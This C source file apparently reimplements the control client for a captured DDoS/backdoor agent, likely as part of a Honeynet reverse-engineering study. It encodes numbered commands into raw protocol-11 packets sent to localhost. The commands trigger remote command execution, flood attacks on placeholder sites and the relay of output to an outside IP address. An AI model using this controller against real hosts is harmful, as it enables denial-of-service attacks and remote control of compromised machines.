#include <netinet/in.h>
#include <stdio.h>


#include <stdio.h>
#include <stdlib.h>


void encode(int command, int len, char *data, char *dest)
{
  char* temp;
  char ch;
  char ch2;
  int i=1;
  int j=0;

  dest[0] = '\002';
  dest[1] = '\000';
  dest[2] = (char)(dest[1] + 23);
  dest[3] = (char)((int)dest[2] + 23 + (int)command);

  for (i=0; i<len; i++)
    {
      //      if (i != 2)
      //	{
	  dest[i+4] = (char)((int)dest[i+3] + 23 + (int)data[i]);
	  //	}
	  //else
	  //{
	  //dest[i+1] = (char)((int)dest[i] + 23 + (int)command);
	  //}
    }

  /*
  char* temp;
  char ch;
  char ch2;
  int i=1;
  int j=0;

  ch = 2; //(char)&data[len];
  temp = malloc(len+2 * sizeof(char));
  temp[0] = ch;

  for (i=len, j=1; i > 0; i--, j++)
    {
      fprintf(stdout, "i = %d\n", i);
      ch2 = (int)(data[i-1] + 23 + (int)ch); // first part of encoding.
      temp[j] = (char)ch2;
      ch = (int)data[i-1];
    }

  strncpy(dest, &temp[0], len);
  */
}

void populatecmdStr(char *p, int command)
{

  // clear the memory segment out.
  bzero(p, 2048);

  // enter the text for the appropriate command into the buffer
  switch(command)
    {
    case 1:
      // this command does sends the results of the command run 
      // in 3 to various ip addresses. possibly setup by command 2...
      strcpy(p, " 123.123.123.123");
      break;

    case 2:
      // dunno, but sets something up for 1 to kick off.
      // possibly maps the contents of the output file from command
      // 3 into memory and removes the temp file.
      strcpy(p, "dunno what this does yet"); 
      break;

    case 3:
      // this command executes the command passed starting at buf[4]
      strcpy(p, "rpcinfo -p 127.0.0.1");
      break;

    case 4:
      // Here is our first DDOS attack. This one picks the host given as the 
      // target, and creates many 
      strcpy(p, "          WWW.CYBERARMY.COM");
      break;

    case 5:
      strcpy(p, "              www.myhatedsite.com");
      break;

    case 6:
      strcpy(p, "                  23456");
      break;

    case 7:
      strcpy(p, "   /root/TheHoneyNet/client/runcmd these are the args for cmd 7");
      break;

    case 8:
      strcpy(p, "dunno what this does yet");
      break;

    case 9:
      strcpy(p, "           www.attackme.com");
      break;

    case 10:
      strcpy(p, "               www.yetanotherattack.com");
      break;

    case 11:
      strcpy(p, "               www.firewhenready.com");
      break;

    default:
      fprintf(stderr, "Unknown command requested\n");
      exit(1);
      break;

    }

}

int main(int argc, char **argv)
{
  int sock = -1; /* sock fd */
  int conn = -1; /* connection id */
  const char* host = "127.0.0.1";
  int i=0;
  int loop = 1;
  char str[2048];
  char rect[2048];
  char *host_in;
  struct sockaddr_in sin;
  struct in_addr ina;
  char buf[2048];
  char buf2[2048];
  char *p = &buf[0];
  char *p1 = &str[0];
  int len = 0;
  int cmd = 0;

  if (argc < 2) 
    {
      fprintf(stderr, "Wrong command line, please try again\n");
      exit(1);
    }
  else
    {
      cmd = atoi(argv[1]);
      if (cmd == 0 && argv[1][0] != '0')
	{
	  fprintf(stderr, "Failed to parse command number\n");
	  exit(2);
	}
      else if (cmd < 0 || cmd > 11)
	{
	  fprintf(stderr, "Command must be in the range of 0 -> 11\n");
	  exit(3);
	}
    }
  
  populatecmdStr(p, cmd);

  len = strlen(p) + strlen(p1) + 1;
  p1 = &str[0];
  //str[0] = 2;
  //  str[len - 1] = (char)(9 + 1) & 255;
  encode(cmd, 402, p, p1);
  //addr.sin_port = 11;
  if ((inet_aton(host, &ina)) == 0 )
    {	
      fprintf(stderr, "Error converting address to in_addr\n");
      return 1;
    }
  else
    {
      fprintf(stdout, "Got socket %d\n", ina.s_addr);
      host_in = (char *)inet_ntoa(ina);	
      fprintf(stdout, "Got reverse address %s\n", host_in);
    }
  
  if ((sock = socket(PF_INET, SOCK_RAW, 0xb)) == -1)
    {
      fprintf(stderr, "Failed to create socket\n");
      return 1;
    }
  else
    {
      bzero ((char *)&sin, sizeof(sin));
      sin.sin_family = AF_INET;
      sin.sin_port = 11;
      sin.sin_addr = ina;
      
      if ((conn = connect(sock, &sin, sizeof(sin))) == -1)
	{
	  fprintf(stderr, "Unable to  connect to socket\n");
	  return 1;
	}
      
      while (loop == 1)
	{
	  //			for (i=0; i < 210; i++)
	  
	  
	  //			fprintf(stdout, "Input string to send (ENTER to quit) :");
	  
	  //fgets(str, 2048, stdin);
	  /*
	   * if (str[0] == 10)
	   {
	   fprintf(stdout, "Fred doesn;t like u\n");
	   loop = 0;
	   break;
	   }
	  */
	  
	  fprintf(stdout, "Attempting to send %s to server %s\n", str, host_in);
	  send(sock, str, 402, MSG_DONTWAIT);
	  //i=-1;	
	  //bzero ((char *)&rect, 2048);
	  //i = recv(sock, (void *)&rect, 2048, MSG_DONTWAIT);
	  //fprintf(stdout, "Recieved %d bytes from %s\n", i, host_in);
	  //fprintf(stdout, "Response: %s (length %d)\n", rect, strlen(rect));
	  loop = 0;
	}
      return 0;
    }
  
  return 0;
  
}

  
